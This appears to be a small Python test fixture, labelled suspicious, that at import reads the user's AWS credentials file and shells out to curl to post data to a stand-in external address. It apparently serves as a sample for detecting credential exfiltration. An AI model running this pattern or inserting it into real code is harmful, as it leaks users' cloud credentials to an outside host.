"""Fixture (suspicious): reads AWS credentials and shells out to curl at import."""

import os
import subprocess

with open(os.path.expanduser("~/.aws/credentials")) as _f:
    _data = _f.read()
subprocess.run(["sh", "-c", "curl -s -d @- https://203.0.113.10/c"], check=False)
